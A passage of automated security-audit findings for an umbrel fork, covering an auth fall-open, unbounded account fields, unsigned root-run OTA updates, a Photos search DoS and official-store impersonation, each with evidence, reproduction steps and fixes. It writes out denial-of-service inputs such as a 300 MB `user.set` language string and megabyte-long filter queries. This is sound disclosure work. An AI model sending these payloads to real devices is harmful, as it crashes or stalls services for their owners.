2. publicProcedureWhenNoUserExists falls open for every route on that tier whenever the umbreld store is empty, including when the store is empty only because the real data directory failed to mount and an in-memory fallback is in use. Fix criteria: Procedures that are public 'when no user exists' should distinguish a never-onboarded device from a device whose data failed to mount (config partition still holds raid/user state), and destructive or ownership-changing procedures (factoryReset, user.register, raid setup) must not be unauthenticated in the latter case.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing authentication
**CWE:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257914

---

# Member-settable account fields have no size limit and bloat the central store parsed on every request

## Details
The user module lets an authenticated member account write several free-form strings into its own account record: `user.set` (privateProcedureWithMembers, routes.ts:427) accepts `name`, `language` and `temperatureUnit` as bare `z.string()` with no `.max()`, and `user.enable2fa` accepts an arbitrary `totpUri`. `setAccountLanguage`/`setAccountTemperatureUnit` pass the raw value to `#updateMember`, which merges it into the `members` array and writes the whole store; `setAccountName` only checks uniqueness. No layer bounds the HTTP request body on this path: `/trpc` is mounted with no express body parser, the tRPC express adapter is created without `maxBodySize`, `requestTimeout` is 0, and lan-ingress forwards bodies via http-proxy-middleware streaming. Only the WebSocket transport is bounded (`MAX_WEBSOCKET_PAYLOAD_BYTES` = 1 MiB); the HTTP POST transport the attacker uses is not.

The values land in `umbrel.yaml`, the single central store for the daemon. `FileStore` has no in-memory cache: every `get()` reads the file and `yaml.load`s the entire document, and every `set()` re-reads, mutates and `yaml.dump`s it. `Auth.authenticate` calls `#accountExists` → `user.exists()`/`user.getMember()` → `store.get()` on every authenticated request, so once the store is bloated every request from every account (including the owner) pays a full parse of the oversized document.

A member needs one request — e.g. `user.set` with `{language: 'A'.repeat(3e8)}` (language has no uniqueness or Samba side effects, so nothing else rejects it) — to persist a ~300 MB scalar. From then on every store read allocates and parses hundreds of MB, every request takes seconds and consumes on the order of 1 GB transient memory; a handful of concurrent requests exhausts memory on Raspberry Pi/Umbrel Home class hardware and crashes umbreld (the root daemon), which reloads the same store on every systemd restart. The public `listAccounts` query also returns the oversized `name` to every pre-login visitor, and a Samba-enabled member's `name` is rendered into smb.conf by `applyShares`. Recovery requires the owner to delete the member through an already-degraded UI or to edit `umbrel.yaml` over SSH.

This is a persistent, single-input, attacker-sized allocation (the bound is the string length the member chooses, not a constant in the code), not volumetric traffic, and it crosses the member → device boundary in the threat model. Dependency assumptions: @trpc/server ^11.18.0 imposes no request-body limit when `maxBodySize` is not supplied (documented default: unlimited); http-proxy-middleware ^2.0.6 streams request bodies without a size cap; js-yaml ^4.1.0 parses scalars character by character with no document size limit.

## Evidence
1. [packages/umbreld/source/modules/user/routes.ts:427–445](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L427-L445)
   `user.set` is privateProcedureWithMembers (any member). Its input schema accepts `name`, `language` and `temperatureUnit` as bare `z.string()` with no `.max()`; each value is passed straight to setAccountName/setAccountLanguage/setAccountTemperatureUnit and persisted into the member's record in umbrel.yaml.
2. [packages/umbreld/source/modules/user/routes.ts:365–376](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L365-L376)
   `user.enable2fa` (member-capable) stores the client-supplied `totpUri` string verbatim after a token check the client can trivially satisfy for any secret it chose; the URI has no length bound, giving a second unbounded persistent field.
3. [packages/umbreld/source/modules/user/user.ts:470–483](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L470-L483)
   #updateMember merges the unbounded updates into the `members` array and writes the whole store; setAccountLanguage/setAccountTemperatureUnit (lines 627-647) and setAccountName (570-618) call it with the raw value, performing no length validation.
4. [packages/umbreld/source/modules/utilities/file-store.ts:56–115](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/utilities/file-store.ts#L56-L115)
   FileStore has no cache: every `get()` reads umbrel.yaml from disk and `yaml.load`s the entire document, and every `set()` re-reads, mutates and `yaml.dump`s it. An oversized scalar therefore costs a full parse/serialize of hundreds of MB on every store access.
5. [packages/umbreld/source/modules/auth/auth.ts:415–437](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L415-L437)
   `authenticate` calls #accountExists (lines 953-956) → user.exists()/getMember() → store.get() on every authenticated tRPC/HTTP request, so once the store is bloated every request by every account pays the full parse cost.
6. [packages/umbreld/source/modules/server/trpc/index.ts:69–75](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/index.ts#L69-L75)
   The tRPC express middleware is created without `maxBodySize`; no express body parser or other middleware bounds the request body before tRPC reads it, so a request body of hundreds of MB is accepted.
7. [packages/umbreld/source/modules/server/index.ts:108–115](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L108-L115)
   Server-wide `requestTimeout = 0`, so a very large upload is never cut off by a request timeout.
8. [packages/umbreld/source/modules/user/routes.ts:94–101](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L94-L101)
   `listAccounts` is public and returns every account's `name`, so the bloated value is also served to every unauthenticated visitor of the login page, amplifying the effect.

## Impact
No confidentiality or integrity impact on other accounts' data. Availability impact is high: the whole umbreld daemon (dashboard, app gateway auth, files, photos for every account including the owner) becomes extremely slow or crash-loops, the condition persists across restarts, and recovery needs owner intervention through a degraded UI or SSH.

## Reproduction steps
1. Attacker is any member account (low privilege) on the LAN/Tailscale/Tor. They send a single tRPC `user.set` (or `enable2fa`) mutation over the dashboard with a hundreds-of-MB string for `language`/`name`/`temperatureUnit`/`totpUri`. No validation, body limit or timeout intervenes; the value is written to umbrel.yaml. Every subsequent request by any account forces a full parse of the bloated store; concurrent requests exhaust memory and crash the root daemon, which reloads the same store on restart. No user interaction and no special deployment condition is required.

## Recommended fix
1. Member-writable account fields (`name`, `language`, `temperatureUnit`, `totpUri`) are accepted and persisted without any length bound, so untrusted input of arbitrary size lands in the central store that is fully parsed on every request. Fix criteria: Every string a member can persist through the user routes has a tight server-side maximum (e.g. tens of characters for name/language/temperatureUnit, a few hundred for an otpauth URI, which should also be validated as a well-formed otpauth URL). After the fix, a `user.set`/`enable2fa` request carrying an oversized value is rejected with a validation error and umbrel.yaml is unchanged.
2. No layer bounds tRPC request bodies: the express adapter is created without `maxBodySize`, there is no body parser on `/trpc`, and the server request timeout is disabled, so arbitrarily large JSON inputs reach procedure handlers. Fix criteria: Requests to `/trpc` exceeding a modest body size (JSON inputs do not legitimately approach megabytes) are rejected before parsing, independent of per-procedure schemas, so an oversized mutation fails with 413/400 and never allocates the full body.

---
**Severity:** HIGH
**Status:** Open
**Category:** Unbounded resource allocation
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257912

---

# OTA update executes unsigned remote script and bundle as root with TLS as sole integrity control

## Details
The umbrelOS OTA pipeline has no cryptographic integrity check at any stage; the only protection is TLS to three independently trusted hosts.

1. `getLatestRelease` (update.ts:52-68) fetches `https://api.umbrel.com/latest-release?...` and returns the JSON as-is, including an `updateScript` URL string.
2. `performUpdate` (update.ts:82-88) does `fetch(updateScript)` with no restriction on scheme or host (an `http://` URL or any third-party host is accepted, redirects are followed, `result.ok` is never checked), reads the body as text and executes it with `$\`bash -c ${contents}\`` — umbreld runs as root under systemd, so the script runs as root with no sandbox.
3. The script that is conventionally served (`scripts/update-script`, lines 75-78) then runs `rugix-ctrl update install --reboot set --insecure-skip-bundle-verification https://download.umbrel.com/release/2.0.0/<bundle>`, explicitly disabling rugix's bundle signature verification, so the replacement root filesystem is also installed unverified.

Consequently any single one of the following positions yields root code execution on every device whose owner installs an update: control of (or a valid-certificate MITM on) api.umbrel.com; control of the `updateScript` origin — by default a mutable git tag on raw.githubusercontent.com, so anyone with push rights to the repository can retarget the tag; or control of download.umbrel.com, which can serve an arbitrary unsigned rootfs bundle. The threat model lists 'the update server — an attacker who controls or MITMs them' as an adversary and boundary (8) 'OTA bundle <-> root filesystem'; the code gives that adversary unconditional root rather than requiring a signature by an offline release key.

The dashboard shows release notes from the same manifest and the owner clicks 'Install update'; an attacker in one of these positions can also advertise a bogus newer `version` to prompt the click. The `update` procedure is owner-only, and the MCP `system-management` tool can call it as well.

## Evidence
1. [packages/umbreld/source/modules/system/update.ts:82–88](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/update.ts#L82-L88)
   performUpdate fetches whatever URL the manifest's `updateScript` field names (no scheme/host allowlist, no result.ok check, Node's fetch follows redirects by default), reads the body as text and executes it with `bash -c <contents>` via execa. umbreld runs as root, so the script runs as root. No checksum or signature is checked at any point.
2. [packages/umbreld/source/modules/system/update.ts:52–68](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/update.ts#L52-L68)
   getLatestRelease fetches https://api.umbrel.com/latest-release and returns the JSON verbatim; `updateScript` is an arbitrary URL chosen by whoever controls (or can MITM with a device-trusted certificate) api.umbrel.com.
3. [scripts/update-script:77–78](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/scripts/update-script#L77-L78)
   The script conventionally served (header comment: raw.githubusercontent.com/getumbrel/umbrel/<tag>/scripts/update-script, a mutable git tag) installs the rugix bundle from download.umbrel.com with `--insecure-skip-bundle-verification`, explicitly disabling rugix >=1.0 bundle signature verification; packages/os/build.sh:299 bakes bundles with no signing step, so the OS image itself is unsigned.
4. [packages/umbreld/source/modules/system/routes.ts:196–210](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/routes.ts#L196-L210)
   Owner-only (`privateProcedure` = `ownerProcedure`) `system.update` mutation that runs performUpdate and reboots; the only production caller of performUpdate. Also invoked by the MCP `install_os_update` tool (modules/mcp/tools/system-management.ts:24-31) after assertSystemAccess. There is no automatic/scheduled update, so an owner (or agent) action is required.
5. [packages/os/overlay/etc/systemd/system/umbrel.service:6–8](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/etc/systemd/system/umbrel.service#L6-L8)
   umbrel.service has no User= directive; ExecStart runs umbreld as root, so the `bash -c` child in update.ts:88 executes with root privileges.

## Impact
Arbitrary shell runs as root on the device and/or an arbitrary root filesystem image is installed and booted: full read of all user data, credentials (session store, network/cloud credentials in umbrel.yaml, backup passwords) and app data, arbitrary persistent modification, and the ability to brick the device.

## Reproduction steps
1. Attacker controls (or MITMs with a device-trusted certificate) api.umbrel.com, the updateScript origin (by default a mutable GitHub tag), or download.umbrel.com — remote-service adversaries the threat model names. They serve a manifest with a newer `version` and a script URL of their choosing; when the owner clicks 'Install update' (or an MCP agent with system access calls install_os_update), umbreld fetches the script and runs it with `bash -c` as root, or the stock script installs an unsigned rootfs bundle. Assumes Node 22 WHATWG fetch default redirect-follow and rugix >=1.0 semantics of --insecure-skip-bundle-verification. Needs that privileged network position (AT:P) and the owner's conscious install action (UI:A); no device privileges (PR:N).

## Recommended fix
1. update.ts executes a remotely fetched script as root based solely on the transport (TLS) being intact, with no verification that the script was produced by the project; the manifest may also point the fetch at any URL/scheme. Fix criteria: Before execution, the update script (or a manifest covering it) must be verified against a release signing key embedded in the OS image, and execution must fail closed when verification fails or the fetch is not a 2xx HTTPS response from an allowlisted origin. A manifest pointing at an attacker-controlled URL or a modified script body must not run.
2. scripts/update-script installs the rugix bundle with --insecure-skip-bundle-verification, so the OS image is accepted from download.umbrel.com without a signature. Fix criteria: Rugix bundles must be signed at release time and installed with bundle verification enabled against a trusted key on the device; a bundle not signed by that key must be rejected.

---
**Severity:** HIGH
**Status:** Open
**Category:** Unverified code download
**CWE:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257911

---

# Unbounded Photos filter query runs one full device-wide FTS scan per term on the shared reader

## Details
Photos list/neighbor filtering accepts a search string of unbounded length from any authenticated account and performs reader work proportional to the number of terms times the number of device-wide FTS matches, plus a super-linear FTS5 expression parse for a single long term, on the one shared bulk-lane reader with no deadline.

Path: `photos.items.list` / `photos.items.neighbors` (routes.ts:91-114, privateProcedureWithMembers) validate `filter.query` only as `z.string().optional()` (routes.ts:32-41). `PhotosRepository.listItems` builds `filterQuery` (one EXISTS per whitespace-separated term, repository.ts:1575-1601) and, because a query makes the filter non-simple, calls `#filterCandidates` (735-752), which for every term of 3+ code points runs `SELECT ... entry_names_fts MATCH ? UNION SELECT ... media_metadata_fts MATCH ? LIMIT 1001`. The FTS tables are global (migrations.ts:192-198, 356-362: FTS5 trigram over all accounts' entries); in SQLite a `UNION ... LIMIT` evaluates both sides completely into the de-duplication table before the limit applies, so each term costs a full enumeration of every device entry matching its trigrams (joined to entries and contents). The loop advances to the next term whenever a term produced more than 1000 rows, so with terms such as `jpg jpg jpg ...` (every JPEG name on the device, or 1001 files the member uploads) T terms cost T full scans: O(T x M) with T up to ~250k over the 1 MiB WebSocket transport (server/index.ts:43; the dashboard itself uses WS, ui trpc.ts:104-125) and M the device-wide match count. Only afterwards do the COUNT and page statements run with T EXISTS clauses; SQLite's expression-depth limit (default 1000) can reject those, but the #filterCandidates work has already been spent, and T <= ~900 passes and is evaluated twice more per request. `neighbors` materializes the same predicate into `filtered_items` (889-900).

A second shape: one whitespace-free term of ~1 MiB passes through `ftsTrigramExpression` (1740-1747) into a MATCH expression of N distinct phrases (N in the hundreds of thousands) joined by AND, used twice in #filterCandidates and twice in each main statement. Dependency assumption (SQLite bundled with better-sqlite3 12.11.1): FTS5's parser flattens left-associative AND chains by allocating a new node and memcpy-ing the accumulated child array on every step (`fts5ExprAddChildren`), i.e. O(N^2) pointer copies per parse, on the order of 10^11 for N ~ 5x10^5, before any index lookup.

Both shapes execute on the bulk lane (reader.ts:48-52) of a pool with a single shared bulk slot (reader-pool.ts:56-59) whose jobs have no execution timeout and whose queue never rejects (as recorded for files-search-query-length-quadratic-fuzzy-dos). A member can therefore stall Files search, Photos summary/albums/sources and every query-bearing Photos list for the owner for minutes per request and indefinitely by repeating, crossing the member -> owner boundary. The `/photos?q=` hand-off (view-context.tsx:147-191) lets an unauthenticated attacker trigger a smaller (URL-length-bounded, ~4k terms) instance through a logged-in victim's click. This is the Photos sibling of the verified Files search finding and is not covered by it (different route, different repository code, different sink).

## Evidence
1. [packages/umbreld/source/modules/photos/repository.ts:735–751](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L735-L751)
   #filterCandidates splits filter.query on whitespace and, for every term of 3+ code points, executes a separate `SELECT ... FROM entry_names_fts ... MATCH ? UNION SELECT ... FROM media_metadata_fts ... MATCH ? LIMIT 1001`. The FTS tables are device-wide (not account scoped) and SQLite applies the LIMIT after the UNION's ephemeral de-duplication, so each term fully enumerates every matching entry on the device. The loop only stops early when a term yields <= 1000 rows; a term matching more rows (e.g. `jpg`) makes it continue to the next, so an attacker-chosen number of terms T costs T full scans.
2. [packages/umbreld/source/modules/photos/repository.ts:1575–1600](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L1575-L1600)
   filterQuery adds one correlated EXISTS clause per term (FTS MATCH for 3+ code points, instr() over authorized_locations otherwise) with no cap on term count or query length; the main COUNT and page queries each evaluate all of them.
3. [packages/umbreld/source/modules/photos/repository.ts:1740–1746](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L1740-L1746)
   ftsTrigramExpression turns a term into one double-quoted phrase per distinct trigram joined by AND. A single whitespace-free term of ~1 MiB yields hundreds of thousands of phrases in one MATCH expression.
4. [packages/umbreld/source/modules/photos/repository.ts:783–805](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L783-L805)
   listItems builds the where clause, runs #filterCandidates for any non-simple filter (a query makes it non-simple), then executes the COUNT(*) and the page query with the full where clause: the per-term work is done once per term in #filterCandidates and again in both main statements.
5. [packages/umbreld/source/modules/photos/repository.ts:889–899](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L889-L899)
   neighbors with a query materializes `filtered_items` from logical_items with the same per-term EXISTS clauses, giving a second entry point for the same cost.
6. [packages/umbreld/source/modules/photos/routes.ts:32–40](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/routes.ts#L32-L40)
   filterSchema validates query as a bare `z.string().optional()`: no length cap, no term cap. The schema is shared by items.list and items.neighbors.
7. [packages/umbreld/source/modules/photos/routes.ts:91–113](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/routes.ts#L91-L113)
   items.list and items.neighbors are privateProcedureWithMembers, so a non-owner member account reaches them.
8. [packages/umbreld/source/modules/files/file-index/reader.ts:48–51](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/reader.ts#L48-L51)
   Any listItems/neighbors call with filter.query is routed to the 'bulk' lane, the same single shared slot used by Files search, Photos summary/listSources/listAlbums.
9. [packages/umbreld/source/modules/files/file-index/reader-pool.ts:56–58](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/reader-pool.ts#L56-L58)
   Default pool size 2 with 1 reserved interactive reader leaves exactly one slot for all bulk reads; reads have no execution deadline and the queue is unbounded (as established in files-search-query-length-quadratic-fuzzy-dos), so one pathological query blocks every bulk read for every account for its full duration.
10. [packages/umbreld/source/modules/server/index.ts:43](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L43)
   tRPC over WebSocket accepts 1 MiB payloads, so a single items.list call can carry ~250k four-byte terms or one ~1 MiB term.
11. [packages/ui/src/trpc/trpc.ts:104–124](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/trpc/trpc.ts#L104-L124)
   The dashboard sends authenticated queries over the WebSocket link, so the photos query travels on the 1 MiB transport by default.
12. [packages/ui/src/features/photos/components/view-context.tsx:147–148](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/photos/components/view-context.tsx#L147-L148)
   useSearchState seeds the applied search text from the `q` URL parameter; lines 179-191 re-apply any later `q` verbatim. A link `/photos?q=<terms>` sent to a logged-in victim makes their browser issue the filter query (bounded by URL length, ~16 KB, so a weaker secondary vector).
13. [packages/umbreld/source/modules/files/file-index/migrations.ts:192–197](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/migrations.ts#L192-L197)
   entry_names_fts is an FTS5 trigram detail=none table over all entries' search_name (name including extension), so a term like `jpg` matches every JPEG on the device regardless of account.

## Impact
No confidentiality or integrity impact. Availability: the single shared bulk-lane reader is monopolised for the duration of each request and the backlog can be grown without bound, so Files search, Photos summary/albums/sources and all searched Photos lists are denied for every account including the owner, and one CPU core is saturated. Interactive reads (thumbnails, point lookups), directory listing, the dashboard and apps keep working, so this is a sustained partial loss, rated LOW.

## Reproduction steps
1. Attacker: any authenticated account including a non-owner member (threat-model adversary) over the LAN/Tor/Tailscale dashboard. Delivery: one tRPC `photos.items.list` (or neighbors) call over the WebSocket transport with `filter.query` of up to 1 MiB: either ~250k repeated common terms (each matching >1000 device-wide entries; the member can ensure that by uploading 1001 tiny .jpg files) or one 1 MiB whitespace-free term. No length cap, no reader deadline and no queue bound stand in the way; the request can be repeated to sustain the outage. A weaker unauthenticated variant uses a `/photos?q=` link clicked by a logged-in victim.

## Recommended fix
1. filter.query is never bounded in length or term count between routes.ts, PhotosRepository.filterQuery and #filterCandidates, while per-term work is a full device-wide FTS enumeration and a long single term produces a super-linear FTS5 expression. Fix criteria: Queries longer than a small fixed bound (a few hundred code points) or with more than a small number of terms are rejected at the tRPC input and again in the repository before any SQL runs; #filterCandidates stops after a bounded number of candidate probes and account-scopes or caps its scans. Verify that a 1 MiB WebSocket items.list request and a 16 KB `/photos?q=` request are both rejected without the reader executing a MATCH.
2. Bulk-lane reader jobs have no execution deadline and the pool accepts an unbounded backlog, so one pathological read holds the shared slot indefinitely. Fix criteria: Reader jobs are bounded in execution time (per-job timeout that interrupts/replaces the worker) and bulk-lane admission is bounded per principal, so a slow or repeated read cannot hold the slot beyond a bounded period. Verify that a deliberately slow Photos filter read is cancelled and queued legitimate bulk reads then complete.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Algorithmic complexity DoS
**CWE:** [CWE-407](https://cwe.mitre.org/data/definitions/407.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258396

---

# Community store's self-declared meta.id is trusted as registry identity: official-store impersonation, management-UI self-hiding and dashboard-wide suppression of official app updates

## Details
umbreld derives a community app store's registry identity from content the store author controls. `AppRepository.readRegistry()` (app-repository.ts:146-158) loads `meta` from the repository's own `umbrel-app-store.yml` with no validation (`AppRepositoryMetaSchema` exists but is never applied), no reservation of the official id `umbrel-app-store`, and no uniqueness check. The namespace confinement at line 184 (`meta.id === 'umbrel-app-store' || app.id.startsWith(meta.id)`) and the `appStoreId: meta.id` stamp at line 188 are both evaluated against that attacker-chosen value, and `sanitizeRegistry`/`listRepositories` forward `meta.id`/`meta.name` unchanged to every dashboard. A store declaring `id: umbrel-app-store` (or `''`/a one-letter prefix) is therefore accepted, may publish manifests for any official app id, and has its apps labelled as official.

The dashboard trusts that identity. (1) Official-store impersonation: `AvailableAppsProvider` keys registries with remeda `indexBy(repos, r => r.meta.id)` (lockfile pins remeda 1.61.0; assumption: last duplicate key wins). Community repositories follow the default one in `appRepositories`, so the impersonating store replaces the official entry in `repoAppsKeyed`/`repoAppsGroupedByCategory`; `useAvailableApp()` (the `/app-store/:appId` page), category pages and `resolveStorefront` then serve its manifests, while `registryAppPath` routes them to `/app-store/<id>` with no CommunityBadge (rendered only under `/community-app-store`) and `Markdown` gives them the react-markdown rendering withheld from community routes. Official app pages for ids the store does not declare throw 'App not found'. An id only the impersonating store declares installs from it (`resolvedApps` first-wins, `getAppTemplateFilePath`) after the owner clicks Install on a page that presents it as official. (2) Self-hiding: both the management dialog (community-app-store-dialog.tsx:81-83) and the header menu (store-header.tsx:271-273) drop stores whose `meta.id === UMBREL_APP_STORE_ID`; nothing else in the UI calls `appStore.removeRepository`, so the owner cannot see or remove the store from the dashboard and must edit umbrel.yaml over SSH. (3) Update suppression: when the store re-declares official app ids, `indexRegistryApps` marks them ambiguous; `useAppsWithUpdates` builds only from `appsKeyed`, the UI never calls the server's `apps.updates`, and umbreld has no automatic app update, so every pending update for those apps disappears from the shelf, dialog, header count and dock badge, and `installApp`/`updateApp`/`InstallButtonConnected` refuse them with 'app-id-conflict'. A store the owner added for one app can thereby silently hide and block security updates for all installed official apps.

All three effects follow from the 5-minute re-clone and the next `appStore.registry` fetch, before any install. `meta.id` is also interpolated into string `<Link to>` targets (store-header.tsx:305, community-app-store-dialog.tsx:190/204), so a `?`/`#` in the id can set the dialog query slot on click (react-router-dom 6.30.3 parsePath); that only feeds the already-verified `dashboard-app-launch-path-query-param-javascript-url-window-open-xss`, whose attacker needs no store at all, so it is noted here as a symptom of the missing validation rather than rated.

Step-3 gain: the project concedes to an added store's author root on the host once the owner installs one of its (community-badged) apps (locale `community-app-stores.warning`; lead dismissed-app-1284-1e0e), and the rejected `community-store-shadows-installed-app-update-origin` was declined on that basis. It does not concede that a merely-added store may replace the official store's registry entries, remove itself from the only removal UI, or blank and block official app updates dashboard-wide; the prefix filter, the ambiguity quarantine ('unsafe to act on', lib/app-store-registry.ts:14-18) and the badge/plain-text controls are the shipped confinement this path works around. Condition: the attacker must be the author of a store the owner has added; members browsing the store see the same impersonated pages.

## Evidence
1. [packages/umbreld/source/modules/apps/app-repository.ts:146–157](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app-repository.ts#L146-L157)
   Root cause. For every non-default repository `meta` is `yaml.load` of the repository's own umbrel-app-store.yml, cast to AppRepositoryMeta with no validation: AppRepositoryMetaSchema (schema.ts:15) is never applied, 'umbrel-app-store' is not reserved, and uniqueness across repositories is not checked. The store author therefore chooses the registry identity umbreld reports for their store.
2. [packages/umbreld/source/modules/apps/app-repository.ts:180–189](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app-repository.ts#L180-L189)
   The namespace confinement ('Filter out invalid IDs', `meta.id === 'umbrel-app-store' || app.id.startsWith(meta.id)`) is evaluated against the attacker-chosen meta.id, so `id: umbrel-app-store`, `id: ''` or a one-letter id lets the store publish manifests for any official app id; line 188 then stamps each app `appStoreId: meta.id`, the value the dashboard uses to route and label it as official or community.
3. [packages/umbreld/source/modules/apps/app-store.ts:67–71](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app-store.ts#L67-L71)
   sanitizeRegistry forwards meta.id and meta.name unchanged to the owner and member dashboards (appStore.registry); listRepositories (190-194) does the same for the management dialog.
4. [packages/ui/src/providers/available-apps.tsx:39–43](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/providers/available-apps.tsx#L39-L43)
   `indexBy(repos, repo => repo.meta.id)` — remeda (lockfile 1.61.0; assumption: last item wins on duplicate keys) — keys registries by the attacker's id. Community repositories follow the default repository in appRepositories, so a store declaring `id: umbrel-app-store` replaces the official entry in repoAppsKeyed and repoAppsGroupedByCategory; `useAvailableApps()`/`useAvailableApp()` (52-61, 86-96) default to that key, feeding the /app-store/:appId page, category pages and resolveStorefront with the community manifests while `repos.find` (59) still returns the official list.
5. [packages/ui/src/modules/app-store/community-app-store-dialog.tsx:81–83](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/app-store/community-app-store-dialog.tsx#L81-L83)
   The only UI that can remove a store lists `store.meta.id !== UMBREL_APP_STORE_ID`; an impersonating store is dropped and its Remove button (193-217) is unreachable. No other UI path calls appStore.removeRepository, so the owner's sanctioned undo for adding the store is gone.
6. [packages/ui/src/features/app-store/components/store-header.tsx:270–273](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/app-store/components/store-header.tsx#L270-L273)
   The header's community-stores menu applies the same filter, so the impersonating store is also absent from the second place the owner would look for it.
